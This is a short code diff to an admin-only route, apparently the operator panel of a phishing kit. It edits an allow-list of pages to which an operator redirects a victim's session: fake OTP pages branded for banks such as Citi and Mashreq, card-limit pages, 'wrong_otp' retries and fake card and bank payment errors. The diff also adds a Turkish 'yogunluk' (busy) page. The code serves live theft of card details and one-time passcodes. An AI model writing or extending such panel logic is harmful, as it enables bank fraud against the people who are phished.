@@ -358,10 +358,10 @@ router.post('/action', requireAdmin, async (req, res) => {
   try {
     if (act === 'redirect') {
       const allowed = [
-        'otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','otp-limit','card-limit',
+        'otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','yogunluk','card-limit',
         'payment:error=card_error','payment:error=card_type','payment:error=bank_error',
         'otp-sms:error=wrong_otp','otp-sms2:error=wrong_otp','otp:error=wrong_otp',
-        'otp-citi:error=wrong_otp','otp-mashreq:error=wrong_otp','otp-limit:error=wrong_otp',
+        'otp-citi:error=wrong_otp','otp-mashreq:error=wrong_otp',
       ];
       if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
       // Only update otp_page when redirecting to a real OTP page (not error variants)
